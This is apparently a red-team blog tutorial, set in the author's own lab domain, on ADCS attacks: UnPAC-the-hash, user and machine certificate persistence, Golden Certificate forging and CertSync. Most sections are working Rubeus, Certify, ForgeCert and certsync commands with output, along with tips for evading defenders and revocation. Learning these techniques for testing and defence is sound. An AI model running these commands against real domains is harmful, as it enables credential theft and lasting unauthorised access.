---
title: Forget Golden Tickets, Live The Era Of Certificates
published: 2025-01-17
description: 'Certificates can be more interesting than golden tickets..'
image: './banner.png'
tags: [red-team, ad, adcs]
category: 'redteam'
draft: false 
lang: ''
---

# Forget Golden Tickets, Live The Era Of Certificates

## Summary

1. Introduction
2. UnPAC-The-Hash
3. Persistence by user certificate
4. Persistence by machine certificate
5. Golden Certificate persistence
6. Certsync against dcsync

### Introduction

When we talk about persistence in Active Directory environments, several methods come to mind. One of the most well-known among attackers is the Golden Ticket, which involves capturing the NTLM hash of the "user" krbtgt and ultimately issuing tickets on behalf of any user. In persistence scenarios, you will always be looking for high-value users such as DA (Domain Admins) and EA (Enterprise Admins).

However, the Golden Ticket technique is already well-known by defenders and relatively easy to detect in more mature environments, particularly where there is monitoring of logs, Kerberos traffic.  

With the growing use of ADCS in corporate environments and similar settings, new exploitation techniques and vulnerabilities continue to emerge, such as the ESC (ESC1, 2, 3, 4... 11, 14). We all know that if ADCS is poorly configured, exploiting any of its vulnerabilities can quickly compromise the entire domain.  

But is ADCS only useful for privilege escalation? In this article, I want to show that ADCS can also be leveraged for various types of persistence and even for credential theft in a more <span style="color: red;">OPSEC</span> friendly manner.

## UnPAC-The-Hash

When Using [PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b) to obtain a TGT (Ticket Granting Ticket), the KDC (Key Distribution Center) includes in the ticket a PAC_CREDENTIAL_INFO structure containing the user's NTLM keys (i.e., LM and NT hashes). This feature allows users to switch to NTLM authentication when remote servers do not support Kerberos while still relying on a Kerberos pre-authentication mechanism using asymmetric verification (i.e., **PKINIT**).

The NTLM hashes can then be retrieved after making a TGS-REQ through U2U, combined with S4U2self, which is a Service Ticket request sent to the KDC where the user requests to authenticate themselves.

The diagram below shows how UnPAC-The-Hash works, but why is this technique advantageous for us as attackers? The advantage is that by generating a user's certificate and using the technique, you will always obtain the current NTLM HASH of that user, meaning:
- Even if the user changes their password, the certificate will remain valid for use (One of the other advantages of ADCS as well, LOL 🤣).
- Even if the user changes their password, with UnPAC, you will always be able to extract the NTLM hash of their current password..

![unpac](./unpac.png)

In the future, we will combine this technique with another one known as CertSync, which is a way to perform "DCSync" but using certificates. Now, let's perform this in a lab; locally, I have an AD environment already set up with ADCS and configured templates.

To execute this technique, the only requirement is that you need to know the certificate's password. So, whenever you're executing, ensure it's from a certificate you created or from a certificate with a weak password that you've managed to brute-force.

```powershell
    .\Rubeus.exe asktgt /getcredentials /user:paulo.victor /certificate:"C:\Tools\esc4-DA.pfx" /password:Senha /domain:corp.local /dc:corp-dc /show

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.2.1

    [*] Action: Ask TGT

    [*] Using PKINIT with etype rc4_hmac and subject: CN=Daniel Moura, OU=Usuarios, OU=Inferi, DC=CORP, DC=LOCAL
    [*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\paulo.victor'
    [*] Using domain controller: 10.0.0.10:88
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

    doIGVjCCBlKgAwIBBaEDAgEWooIFbTCCBWlh....

    ServiceName              :  krbtgt/corp.local
    ServiceRealm             :  CORP.LOCAL
    UserName                 :  paulo.victor
    UserRealm                :  CORP.LOCAL
    StartTime                :  1/10/2025 11:33:04 PM
    EndTime                  :  1/11/2025 9:33:04 AM
    RenewTill                :  1/17/2025 11:33:04 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  rc4_hmac
    Base64(key)              :  YJHc9+T6Rdt8PrWc5eEdZQ==
    ASREP (key)              :  51901227A9A7C2FDF729D40313291627

    [*] Getting credentials using U2U

    CredentialInfo         :
        Version              : 0
        EncryptionType       : rc4_hmac
        CredentialData       :
        CredentialCount    : 1
        NTLM              : **E15E48546D35C3F2EF7FB995A4A9548E**
```

As you can see, I was able to capture the NTLM hash of my user, who is the owner of the template I used and also a Domain Admin within the environment. And as I mentioned, no matter how many times the user changes their password, you will always capture the current hash, all of this without even touching the **LSASS** process.

## Persistence by user certificate

It is also possible to create persistence in the environment through certificates for the user. The idea here is that you already have elevated access within the environment, such as a Domain Admin, to issue this certificate on behalf of a high-privilege user you want to maintain access to.

The step-by-step would be:
- Gain access to a high-privilege user (i.e., DA & EA).
- Request a certificate for that user using a template that allows **Client Authentication**.

By default, ADCS has some templates that allow **Client Authentication**, such as the **User** template, which we will use to generate the certificate for our user. Typically, these certificates have a validity of 1 year, but when they are about to expire, you can simply reissue the same certificate.

In the context below, I have a low-privileged user in my environment, and I will be issuing the certificate in the name of a template vulnerable to ESC1. This will result in a ticket with the Domain Admin user, which will be our target for persistence.

```powershell
.\Certify.exe request /ca:CORP-DC.CORP.LOCAL\CORP-CA /template:"CORP - Kerberos Authentication" /altname:paulo.victor

    
     _____          _   _  __
    / ____|        | | (_)/ _|
    | |     ___ _ __| |_ _| |_ _   _
    | |    / _ \ '__| __| |  _| | | |
    | |___|  __/ |  | |_| | | | |_| |
     \_____\___|_|   \__|_|_|   \__,|
                                __/ |
                                |___/
    v1.0.0

    [*] Action: Request a Certificates

    [*] Current user context    : CORP\danielmoura
    [*] No subject name specified, using current context as subject.

    [*] Template                : CORP - Kerberos Authentication
    [*] Subject                 : CN=Daniel Moura, OU=Usuarios, OU=Inferi, DC=CORP, DC=LOCAL
    [*] AltName                 : paulo.victor

    [*] Certificate Authority   : CORP-DC.CORP.LOCAL\CORP-CA

    [*] CA Response             : The certificate had been issued.
    [*] Request ID              : 21

    [*] cert.pem         :

    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAveH2b8bqL7smcl...

    -----END CERTIFICATE-----


    [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```

```powershell
C:\Tools\openssl\openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1-DA.pfx

    Enter Export Password:
    Verifying - Enter Export Password:

    Get-PfxCertificate -FilePath .\sora-DA.pfx | select *

    EnhancedKeyUsageList : {Client Authentication (1.3.6.1.5.5.7.3.2), Server Authentication (1.3.6.1.5.5.7.3.1), Smart Card Logon (1.3.6.1.4.1.311.20.2.2), KDC Authentication (1.3.6.1.5.2.3.5)}
    DnsNameList          : {Daniel Moura}
    SendAsTrustedIssuer  : False
    Archived             : False
    Extensions           : {System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid...}
    FriendlyName         :
    IssuerName           : System.Security.Cryptography.X509Certificates.X500DistinguishedName
    NotAfter             : 1/10/2026 11:43:37 PM
    NotBefore            : 1/10/2025 11:43:37 PM
    HasPrivateKey        : True
    PrivateKey           : System.Security.Cryptography.RSACryptoServiceProvider
    PublicKey            : System.Security.Cryptography.X509Certificates.PublicKey
    RawData              : {48, 130, 5, 233...}
    SerialNumber         : 54000000150B74ED4CF8ADD060000000000015
    SubjectName          : System.Security.Cryptography.X509Certificates.X500DistinguishedName
    SignatureAlgorithm   : System.Security.Cryptography.Oid
    Thumbprint           : 1DD7B7333ECCF32A83DB5C86CEA9B80B0833C285
    Version              : 3
    Handle               : 2734492773680
    Issuer               : CN=CORP-CA, DC=CORP, DC=LOCAL
    Subject              : CN=Daniel Moura, OU=Usuarios, OU=Inferi, DC=CORP, DC=LOCAL
```

Now, with the certificate in hand, I keep it with me, and for 1 year, I will have this persistence through the user. By combining it with UnPAC-The-Hash, you will always be able to retrieve the current NTLM hash of that user as long as the certificate remains valid 😏.

In my context, I spoke about a vulnerable template, but ideally, as I mentioned above, you would issue this certificate from a standard ADCS template, like the **User** template. Next, we will look at how to implement persistence on machines.

# Persistence by machine certificate

Machine persistence with certificates follows the same concept as before, but instead of needing a high-privilege user, you need to be SYSTEM on the machine. Machine persistence also has its advantages, such as:
- The certificate lasts for 1 year and can be renewed when it is about to expire.
- Even if the computer changes its password, the certificate will still work.
- Even if the computer is reformatted, if it returns to the network with the same name, the certificate will still be valid (THIS IS UNREAL MICROSOFT LMFAAAO).
    * If there is a change in the machine's SID, then the certificate becomes invalid. If the machine is formatted normally, it will have the same SID; if it is formatted and there is a change in hardware, the SID will change.
    * However, with new updates to Certipy/fy, you can specify the SID you want to use in the certificate.


Let's now reproduce this in our lab, the idea is as follows:
- Request a certificate from the CA (Certification Authority) based on the "Machine" template, which in its EKU (Enhanced Key Usage) allows Client Authentication by default.
- Convert the .pem file to .pfx using OpenSSL (<span style="color: red;">OPSEC NOTES</span>: Never use weak passwords for certificates 😑).

```powershell
.\Certify.exe request /ca:CORP-DC.CORP.LOCAL\CORP-CA /template:"Machine" /machine

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=SRV-01.CORP.LOCAL

[*] Certificate Authority   : CORP-DC.CORP.LOCAL\CORP-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 22

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA0XOxnEqKbwpWnAOHKGHs...

-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```powershell
Get-PfxCertificate -FilePath .\srv01-A.pfx | select *

EnhancedKeyUsageList : {Client Authentication (1.3.6.1.5.5.7.3.2), Server Authentication (1.3.6.1.5.5.7.3.1)}
DnsNameList          : {SRV-01.CORP.LOCAL}
SendAsTrustedIssuer  : False
Archived             : False
Extensions           : {System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid...}
FriendlyName         :
IssuerName           : System.Security.Cryptography.X509Certificates.X500DistinguishedName
NotAfter             : 1/11/2026 1:50:33 AM
NotBefore            : 1/11/2025 1:50:33 AM
HasPrivateKey        : True
PrivateKey           : System.Security.Cryptography.RSACryptoServiceProvider
PublicKey            : System.Security.Cryptography.X509Certificates.PublicKey
RawData              : {48, 130, 5, 28...}
SerialNumber         : 5400000016747C52BDC9582CB5000000000016
SubjectName          : System.Security.Cryptography.X509Certificates.X500DistinguishedName
SignatureAlgorithm   : System.Security.Cryptography.Oid
Thumbprint           : 8E19E0FFE7DECD870DE249017F0C548DCDE79A8F
Version              : 3
Handle               : 2539689363184
Issuer               : CN=CORP-CA, DC=CORP, DC=LOCAL
Subject              : CN=SRV-01.CORP.LOCAL
```

With the machine certificate in hand, the next step is simply to perform an **asktgt** with the ticket and its password using Rubeus, and boom, you now have persistence on the target machine.

A characteristic of machines is that their passwords are changed every 30 days, but as we learned in this article about UnPAC, this is no longer a problem for us 🙄.


# Golden Certificate persistence

The Golden Certificate, in essence, is nothing more than the certificate of the CA (Certification Authority), but what can we do with it?

A CA uses its private key to sign certificates, and if an attacker manages to extract it, they can sign any certificate and, by extension, impersonate any domain user.

Let's head to the lab. We need to perform some steps like:
- Backup the CA's private keys to a .p12 format.
- Convert the .p12 to .pem and then to .pfx.
- Use tools like [ForgeCert](https://github.com/GhostPack/ForgeCert) or [Certipy](https://github.com/ly4k/Certipy) to issue the certificate for the user we want to impersonate.

```powershell
Backup-CARoleService C:\Tools\CA-Backup -Password (ConvertTo-SecureString "Senha" -AsPlainText -Force)

dir .\CA-Backup\

Directory: C:\Tools\CA-Backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/01/2025     02:22                DataBase
-a----        11/01/2025     02:22           2597 CORP-CA.p12
```

Now, let's take this **.p12** file to the attacking machine. Remember that tools like **Certipy** can extract the CA certificate remotely, but they require domain administrator privileges.

```powershell
C:\Tools\openssl\openssl.exe pkcs12 -in C:\Tools\CORP-CA.p12 -out C:\Tools\CORP-CA.pem

dir | findstr "CORP-CA"

-a----         1/11/2025   2:22 AM           2597 CORP-CA.p12
-a----         1/11/2025   2:26 AM           3387 CORP-CA.pem

C:\Tools\openssl\openssl.exe pkcs12 -in C:\Tools\CORP-CA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "C:\Tools\CORP-CA.pfx"

dir | findstr "CORP-CA"

-a----         1/11/2025   2:22 AM           2597 CORP-CA.p12
-a----         1/11/2025   2:26 AM           3387 CORP-CA.pem
-a----         1/11/2025   2:30 AM           2587 CORP-CA.pfx
```

Keep this **.pfx** with ALL YOUR SOUL!!!! Now, let's use **ForgeCert** to issue a certificate on behalf of the Domain Admin.

```powershell
 .\ForgeCert.exe --CaCertPath ".\CORP-CA.p12" --CaCertPassword "Senha" --Subject "CN=paulo.victor,OU=Usuarios,OU=Inferi,DC=CORP,DC=LOCAL" --SubjectAltName paulo.victor@corp.local --NewCertPath ".\paulo-da.pfx" --NewCertPassword "Senha"

CA Certificate Information:
  Subject:        CN=CORP-CA, DC=CORP, DC=LOCAL
  Issuer:         CN=CORP-CA, DC=CORP, DC=LOCAL
  Start Date:     1/4/2025 12:56:14 AM
  End Date:       1/4/2030 1:06:13 AM
  Thumbprint:     0C6145AAC4A1BDF07BA3F7D01461797BF511F12C
  Serial:         1125934CE5144B9A4DEFB96CAAA4A9F2

Forged Certificate Information:
  Subject:        DC=LOCAL, DC=CORP, OU=Inferi, OU=Usuarios, CN=paulo.victor
  SubjectAltName: paulo.victor@corp.local
  Issuer:         CN=CORP-CA, DC=CORP, DC=LOCAL
  Start Date:     1/11/2025 2:34:50 AM
  End Date:       1/11/2026 2:34:50 AM
  Thumbprint:     ED557F9E9F3811F07B62EF0517CE494D83E9AD4B
  Serial:         00E32CD49040A22DBBA2BA81A1A6C87F4E

Done. Saved forged certificate to .\paulo-da.pfx with the password 'Senha'
```

Now, let's use **Rubeus** to request a TGT and impersonate the Domain Admin.

```powershell
.\Rubeus.exe asktgt /user:paulo.victor /domain:corp.local /dc:corp-dc.corp.local /certificate:"C:\Tools\paulo-da.pfx" /password:"Senha" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: DC=LOCAL, DC=CORP, OU=Tier0, OU=Usuarios, CN=paulo.victor
[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\paulo.victor'
[*] Using domain controller: 10.0.0.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGVjCCBlKgAwIBBaEDAgEWooIFbTCCBWlhg...

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/corp.local
  ServiceRealm             :  CORP.LOCAL
  UserName                 :  paulo.victor
  UserRealm                :  CORP.LOCAL
  StartTime                :  1/11/2025 2:37:29 AM
  EndTime                  :  1/11/2025 12:37:29 PM
  RenewTill                :  1/18/2025 2:37:29 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  c5brmZK4ioq20251NDOs8w==
  ASREP (key)              :  667FB15683B166E0330E8D3DFE38620E
```

Done, now we are Domain Admin of the environment!!! Just make sure to keep that **.pfx** with you forever, and you will always be able to issue a certificate in the name of any user and impersonate them in the environment.

- <span style="color: red;">OPSEC NOTES</span>: When generating certificates with Certipy/fy, they will be saved in the "**Issued Certificates**" section in **certsrv** within the CA, which gives defenders the possibility of revoking your certificate, which is a problem. However, by using the **Golden Certificate**, you will be generating certificates locally, and they won't be saved in **certsrv**, making it MUCH harder for defenders to revoke your certificate 🔥🧑‍🚒.
- I took the screenshot below after following the steps above, and as we can see, the certificate I issued is not visible within the CA.

![golden](./golden.png)

# Certsync against DCsync

Okay, but almost 98% of red teamers are familiar with **DCSync** and feel comfortable using it. So, what advantages does **CertSync** have?

Well, DCSync exploits the **MS-DRSR** protocol, which is used to replicate data from Active Directory, allowing an attacker to extract credentials directly from a Domain Controller.

The point is that DCSync also uses the **DSRUAPI**, which is monitored and often restricted by an EDR. In the case of a mature environment, you won't be able to carry out this attack. That's where CertSync shines, as it doesn't require the **DSRUAPI** or a Domain Admin, only a user who is an administrator of the CA.

**CertSync** is a technique for remotely dumping the NTDS using the two techniques we covered earlier, such as Golden Certificate and UnPAC-The-Hash, and it does this in a few steps:
- Dumps the list of users, CA information, and also the CRL via LDAP.
- Dumps the CA certificate and its private key (.p12 - Golden Certificate).
- Locally forges a certificate for each user.
- Performs UnPAC on all these certificates to obtain the NTLM hash.

Let's reproduce this in the lab. I will be using my user, which is an administrator of the CA that we will be attacking.

```bash
$ certsync -u paulo.victor -p 'Senha@123' -d corp.local -dc-ip 10.0.0.10 -ns 10.0.0.10
[*] Collecting userlist, CA info and CRL on LDAP
[*] Found 16 users in LDAP
[*] Found CA CORP-CA on CORP.LOCAL(10.0.0.10)
[*] Dumping CA certificate and private key
[*] Forging certificates for every users. This can take some time...
[*] PKINIT + UnPAC the hashes
CORP.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:75431702DEEB8199026DCFCA6EA5C950:::
CORP.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:DDC84A0B28826D6CD4738C5852F38E81:::
....
```

### Conclusion

This article explored how ADCS (Active Directory Certificate Services) can be used for persistence techniques targeting users, machines, and domains. We covered the Golden Certificates and UnPAC-The-Hash techniques for extracting NTLM hashes without accessing LSASS, and how they can combine to maintain access even after password changes or system reconfigurations.

We also discussed CertSync, which offers advantages over DCSync by not requiring DSRUAPI or Domain Admin privileges—just CA administrator access. These techniques bypass traditional defenses, making them effective in mature environments.

ADCS proves to be a powerful tool for attackers, enabling various methods for persistence. If you enjoyed this article, like, share, and stay tuned for more content on ADCS and advanced security techniques.

- Per aspera ad inferi ❤️
